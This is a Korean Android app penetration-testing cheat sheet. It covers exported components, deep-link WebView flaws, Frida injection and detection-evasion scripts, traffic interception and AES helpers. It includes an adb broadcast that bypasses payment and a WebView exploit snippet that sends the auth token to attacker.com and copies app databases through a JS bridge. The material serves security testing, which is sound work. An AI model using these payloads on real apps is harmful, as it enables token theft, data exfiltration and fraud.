...
### Frida Version
```shell
# 17 버전부턴 agent 따로 구현할 시 Java 브릿지가 필요해서 컴파일해야하는 이슈 발생
...
#### Activity
> 인증/Pin 입력 화면 우회를 하거나 디버그/관리자 화면 실행으로 취약점 발생 가능
...
```xml
<!-- 취약: 명시적 exported, intent-filter 있으나 permission 없음 -->
<activity
    ...
    <intent-filter>
        <action android:name="com.app.ADMIN" />
    </intent-filter>
</activity>
```
...
```shell
# am
adb shell am start -n 패키지명/.Activity 경로 --es key value
...
<!-- 외부 노출이 필요하면 signature permission으로 보호 -->
<permission
...
#### Receiver
##### 사례
> **Exported Receiver**: 외부 앱이 임의 Intent로 receiver 트리거 → 내부 상태 변경, 인증 토큰 초기화, 디버그 모드 진입
   
> 불충분한 인가로 발생할 수 있음
   
```xml
<receiver android:name=".PaymentResultReceiver"
          android:exported="true">
    <intent-filter>
...
public void onReceive(Context ctx, Intent intent) {
    if ("success".equals(intent.getStringExtra("result"))) {
        unlockPremiumContent(intent.getStringExtra("item_id"));
    }
}
```
...
```bash
# 공격: 결제 없이 프리미엄 잠금 해제
adb shell am broadcast -a com.app.PAYMENT_COMPLETE \
    --es result success --es item_id "premium_pack_01"
```
...
<!-- 취약 예시 -->
<receiver
    android:name=".PaymentResultReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.app.PAYMENT_COMPLETE" />
    </intent-filter>
...
<receiver
    ...
    android:exported="true"
    android:permission="com.app.permission.PRIVATE_UPDATE">
    <intent-filter>
        <action android:name="com.app.action.UPDATE_PUSH" />
    </intent-filter>
</receiver>
```

#### Provider
> ../ 먹히거나 애초에 root 디렉토리면 시스템 파일 읽기 가능
>  query의 경우 sqli 발생 가능성 존재
...
```shell
# jadx에서 `ContentProvider` 서브클래스의 `query/insert/update/delete/openFile` 구현 확인
# am
...
<!-- 외부 공유가 필요하면 signature permission -->
<permission
    android:name="com.app.permission.READ_USER"
    android:protectionLevel="signature" />
<provider
    android:name=".UserProvider"
    android:authorities="${applicationId}.provider"
    android:exported="true"
    android:readPermission="com.app.permission.READ_USER"
    android:writePermission="com.app.permission.WRITE_USER" />
```
...
```xml
<activity android:name=".WebContainerActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.BROWSABLE" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="myapp" android:host="web" />
    </intent-filter>
</activity>
```
...
webView.loadUrl(url); // 검증 없음

class NativeBridge {
    @JavascriptInterface
    public String getAuthToken() { return TokenStore.get(); }
    @JavascriptInterface
...
<script>
  // 사용자가 메신저/SMS의 myapp://web?url=https://attacker.com/exploit.html 링크 클릭
  const token = AppBridge.getAuthToken();
  fetch("https://attacker.com/steal?t=" + token);
  AppBridge.exec("sh -c 'cp /data/data/com.app/databases/* /sdcard/'");
</script>
```
...
```xml
<!-- 취약: scheme 검증 없는 webview 진입 + autoVerify 없음 -->
...
```
- `<data>` 에 https scheme이 있으나 `android:autoVerify="true"` 누락 → App Link 미보호
- host가 와일드카드(`*.example.com`)이거나 path 검증 없음
- DeepLink Activity가 받은 URI param을 코드에서 검증하는지 (jadx로 `getIntent().getData()` 호출부 추적)
- 동일 Activity가 WebView를 띄울 때 `addJavascriptInterface` + `setJavaScriptEnabled(true)` 동시 사용
- `pathPattern` 정규식이 우회 가능한 형태 (`.*` 과다 사용)
...
### 정보 노출
![](/assets/images/posts/2025-04-28-Android/117803f8ed07fdbf53bde7900d0290ec_MD5.jpeg)

#### 소스코드 정보 노출
단순히 APK 코드 내 중요 정보가 `하드코딩` 되어 있는 경우

#### 단말기 내 사용자 정보 저장
- 단말기 내 알지 못하는 파일들로 중요 정보가 저장될 수 있으므로 파일 수정 시간을 체크하여 해당 취약점이 누락되지 않도록 점검 해야함
- 중요 정보가 암호화 되어있어 보여도, MD5 디코딩으로 평문이 되거나 복호화 키가 단말기 안전하지 않은 영역에 저장되어 있을 경우가 있음
...
- am dumpheap app_pid 저장할경로/이름.hprof - debugging 여부 파악 Manifest에서 `<application android:debuggable:"true" ... />`
- fridump 활용

#### 백그라운드 화면 정보 노출

`/data/system_ce/0/snapshot` 확인
...
## 동적 분석
`Python3 Android.py --type 1 --app "com.Test/Test" --pre-script anti-frida.js --script hook.js --device 127.0.0.1:6666`   
...
SPAWN_KILL_DELAY_SEC = 2  
ATTACH_LOAD_DELAY_SEC = 3  
...
def resolve_script_path(script_name: str) -> Path:  
    """Resolve script name to an absolute path inside SCRIPT_DIR (blocks path traversal)."""  
    candidate = (SCRIPT_DIR / script_name).resolve()  
    try:  
        candidate.relative_to(SCRIPT_DIR)  
    except ValueError as e:  
        raise ValueError(f"Script path escapes script directory: {script_name}") from e  
...
def read_script(script_name: str) -> str:  
    return resolve_script_path(script_name).read_text(encoding="utf-8")  
  
  
def write_log(log_path: str, messages: list[str]) -> None:  
    with open(log_path, "w", encoding="utf-8") as f:  
        f.write("\n".join(messages))  
  
  
def make_on_message(log_path: Optional[str]) -> Callable[[dict, Any], None]:  
    """Create a message handler with log buffer captured via closure (no globals)."""  
    log_buffer: list[str] = []  
...
def parse_target(target: str) -> tuple[str, str]:  
    ...
    # 오른쪽에서 '/' 하나만 기준으로 분리 (프로세스 이름에 '/' 포함 가능)  
    parts = target.rsplit("/", 1)  
    if len(parts) != 2 or not all(p.strip() for p in parts):  
        raise ValueError(  
            "--app must be '<process_name>/<package_identifier>' "  
            "(e.g. 신한라이프(NX/테스트)/com.AFSSHLife.debug)"        )  
  
    process_name, package_id = parts[0].strip(), parts[1].strip()  
  
    # 패키지 식별자 형식 검증  
    if not _PACKAGE_RE.match(package_id):  
        raise ValueError(  
            f"잘못된 패키지 식별자 형식: {package_id!r} "  
            "(역도메인 형식이어야 함, 예: com.AFSSHLife.debug)"        )  
  
    return process_name, package_id  
  
  
def find_running_pid(device: Any, process_name: str) -> Optional[int]:  
...
def load_script(process: Any, script_name: str, on_message: Callable) -> Any:  
    script = process.create_script(read_script(script_name))  
    script.on("message", on_message)  
    script.load()  
    return script  
  
  
def load_scripts(process: Any, script_names: list[str], on_message: Callable) -> list[Any]:  
    return [load_script(process, name, on_message) for name in script_names]  
  
  
def connect_device(remote: Optional[str]) -> Any:  
    """Default to USB device; use remote address when explicitly provided."""  
    if remote:  
...
def spawn_app(  
    ...
    running_pid = find_running_pid(device, process_name)  
    if running_pid is not None:  
        print(f"앱이 이미 실행 중입니다 (pid={running_pid}). 중지시킵니다.")  
        device.kill(running_pid)  
        time.sleep(SPAWN_KILL_DELAY_SEC)  
  
    print("앱을 spawn합니다.")  
    pid = device.spawn([identifier], timeout=SPAWN_TIMEOUT_SEC)  
    process = device.attach(pid)  
  
    if pre_scripts:  
        print(f"pre-script {len(pre_scripts)}개 로드 (resume 전).")  
        load_scripts(process, pre_scripts, on_message)  
  
    device.resume(pid)  
  
    if scripts:  
        print(f"script {len(scripts)}개 로드.")  
        load_scripts(process, scripts, on_message)  
...
def attach_app(  
    ...
    pid = find_running_pid(device, process_name)  
    if pid is None:  
        raise RuntimeError(f"실행 중인 프로세스를 찾지 못했습니다: {process_name}")  
    print(f"pid={pid} 에 attach합니다.")  
    process = device.attach(pid)  
  
    if pre_scripts:  
        print(f"pre-script {len(pre_scripts)}개 먼저 로드.")  
        load_scripts(process, pre_scripts, on_message)  
    ...
    time.sleep(ATTACH_LOAD_DELAY_SEC)  
    sys.stdin.read()  
  
  
def build_parser() -> argparse.ArgumentParser:  
    parser = argparse.ArgumentParser(description="Frida injection helper")  
    parser.add_argument(  
        "--script", required=True, nargs="+",  
        help="JS file(s) to inject (one or more, loaded in order after resume)",  
    )  
    parser.add_argument(  
        "--pre-script", required=False, nargs="+", default=[],  
        dest="pre_script",  
        help="JS file(s) to inject BEFORE device.resume() in spawn mode "  
             "(also runs first in attach mode)",  
    )  
    parser.add_argument(  
        "--app", required=True,  
        help="Target app: '<package_identifier>/<process_name>'",  
    )  
    parser.add_argument(  
        "--type", required=True,  
        choices=["1", "spawn", "2", "attach"],  
        help="Injection mode: 1/spawn or 2/attach",  
    )  
    parser.add_argument(  
        "--log", required=False, default=None,  
        help="Optional path to write captured payloads",  
    )  
    parser.add_argument(  
        "--device", required=False, default=None,  
        help="Frida remote device address (e.g. 127.0.0.1:6666). "  
             "If omitted, the local USB device is used.",  
    )  
    return parser  
...
def main() -> int:  
    ...
    try:  
        process_name, identifier = parse_target(args.app)  
        for name in (*args.pre_script, *args.script):  
    ...
    try:  
        ...
        print(f"Device connection failed: {type(e).__name__}: {e}", file=sys.stderr)  
        return 1  
  
    on_message = make_on_message(args.log)  
  
    try:  
        if args.type in ("1", "spawn"):  
            spawn_app(  
                device, identifier, process_name,  
                args.pre_script, args.script, on_message,  
            )  
        else:  # '2' or 'attach'  
            attach_app(  
                device, process_name,  
        ...
        print(f"Frida operation failed: {type(e).__name__}: {e}", file=sys.stderr)  
        return 1  
...
setImmediate(func_name)
```

### Anti bypass Frida-server

```shell
# frida-server 이름 변경 & 포트변경
adb shell mv /data/local/tmp/frida-server-16.7.19-android-arm64 re
adb shell /data/local/tmp/re -l 0.0.0.0:6666
adb forward tcp:6666 tcp:6666
# adb forward --remove tcp:6666
```

### TCP
1. 앱을 분석해서 TCP 통신을 하는 IP:PORT 를 알아야 함 - tcpdump
    105:51878 - client, 104:9999 - server

2. 포트포워딩 실행 - iptables   
    목적지가 [App_Server_IP]:[Port] 인 패킷들을 [PC_IP]:[PC_Port] 로 보낸다.   
    `iptables -A OUTPUT -t nat -p tcp -d [App_Server_IP] —dport [App_Server_Port] -j DNAT —to-destination [PC_IP]:[PC_Port]`   
    잘 적용 되었는지 확인   
    `iptables -L -t nat`   
    
3. mitm_relay 실행
    `Python3 mitm_relay.py -l [PC_IP] -p [127.0.0.1 or PC_IP]:[BurpPort] -r [App_Server_Port]:[App_Server_IP ]:[App_Server_Port]`
...
console.log(addColor('red', '============== Found Method =============='));
```
...
def get_proxy_status():  
    output = run_adb_command(["adb", "shell", "settings", "get", "global", "http_proxy"])  
...
def get_device_ip():  
    output = run_adb_command(["adb", "shell", "ip", "route"])  
  
    if output is None:  
        return "UNKNOWN"  
  
    # src 뒤의 IP 추출  
    match = re.findall(r"src (\d+\.\d+\.\d+\.\d+)", output)  
    if match:  
        return match  
...
def same_subnet(ip1: str, ip2: str) -> bool:  
    """앞 3 옥텟(Class C 기준)이 같으면 동일 대역으로 판단."""  
    try:  
...
def set_proxy(ip, port):  
    proxy = f"{ip}:{port}"  
    result = run_adb_command(["adb", "shell", "settings", "put", "global", "http_proxy", proxy])  
...
def clear_proxy():  
    result = run_adb_command(["adb", "shell", "settings", "put", "global", "http_proxy", ":0"])  
...
def print_status():  
    ...
    device_ips = get_device_ip()  
  
    print(cyan + "\n===============================")  
    print("  Android Proxy Controller")  
    print("===============================" + clear)  
    ...
    if isinstance(device_ips, list):  
        for device_ip in device_ips:  
            if same_subnet(local_ip, device_ip):  
                print(f"[Android IP] {device_ip}")  
            else:  
                print(f"{red}[Android IP] {device_ip}  ←  동일 네트워크에 없습니다{clear}")  
    else:  
        print(f"[Android IP] {device_ips}")  
  
    if status == "ON":  
        print(f"[STATUS] Proxy: ON ({proxy})")  
    elif status == "OFF":  
        print("[STATUS] Proxy: OFF")  
    else:  
        print("[STATUS] Proxy: ERROR")  
...
function OnTouchListener(){
	Java.perform(function () {
		...
		Java.choose("android.view.View$ListenerInfo", {
			onMatch: function (instance) {
				instance = instance.mOnTouchListener.value;
				if(instance){
...
def AESDecrypt_ECB(enc_str, key_str):
    # 1. key 준비
    key = key_str.encode('utf-8')

    # 2. Base64 decode
    try:
        cipher_bytes = base64.b64decode(enc_str)
    except Exception as e:
...
def pkcs5_pad(data: bytes, block_size=16):
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)


def AESEncrypt_ECB(plain_str, key_str):
    # 1. key 준비
    key = key_str.encode('utf-8') 
...
def AESEncrypt_CBC(text, key):
    key = unquote(key).encode("utf-8")
    iv = key
...
def AESDecrypt_CBC(encrypted_base64, key):
    try:
        key = unquote(key).encode("utf-8")
        iv = key
...
# 사용 예시 / enc.json엔 암호화할 평문을 / dec.txt엔 복호화할 암호문을
key = ""
...
print(AESEncrypt_ECB(plain, key))
print(AESDecrypt_ECB(enc, key))
```